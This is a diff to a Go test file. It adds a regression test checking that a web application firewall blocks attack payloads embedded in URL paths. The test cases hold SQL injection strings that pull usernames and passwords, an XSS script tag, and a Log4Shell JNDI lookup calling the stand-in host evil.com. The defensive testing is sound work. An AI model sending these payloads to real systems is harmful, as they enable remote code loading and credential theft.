@@ -5,6 +5,7 @@ import (
 	"io"
 	"net/http"
 	"net/http/httptest"
+	"net/url"
 	"strings"
 	"testing"
 
@@ -103,6 +104,34 @@ func TestWAF_InspectsArgsAndForms(t *testing.T) {
 	}
 	if code := wafDo(t, h, http.MethodPost, "/x", "application/x-www-form-urlencoded", "q=union select from users"); code != http.StatusForbidden {
 		t.Errorf("urlencoded SQLi not blocked: got %d", code)
+	}
+}
+
+// TestWAF_InspectsRequestURI is a regression test for VULN-M01: the built-in
+// ruleset only inspected ARGS (query-string/body params), never REQUEST_URI,
+// so a payload embedded directly in a REST path segment (/api/orders/{payload}
+// rather than /api/orders?id={payload}) sailed through every rule untouched.
+func TestWAF_InspectsRequestURI(t *testing.T) {
+	h := wafTestHandler(t)
+
+	cases := map[string]string{
+		"path SQLi":      "/api/orders/1' UNION SELECT username,password FROM users--",
+		"path XSS":       "/search/<script>alert(1)</script>",
+		"path Log4Shell": "/api/items/${jndi:ldap://evil.com/a}",
+		"path bool SQLi": "/api/x/1' OR '1'='1",
+	}
+	for name, path := range cases {
+		// Build via url.URL so the raw payload is percent-encoded into a valid
+		// request line — the point of the test is that Coraza's REQUEST_URI
+		// variable still decodes and inspects it, exactly like a real client
+		// sending the same characters over the wire would.
+		u := &url.URL{Path: path}
+		r := httptest.NewRequest(http.MethodGet, u.String(), nil)
+		rec := httptest.NewRecorder()
+		h.ServeHTTP(rec, r)
+		if rec.Code != http.StatusForbidden {
+			t.Errorf("%s: path-embedded payload not blocked: got %d, want 403 (path=%q)", name, rec.Code, path)
+		}
 	}
 }
 
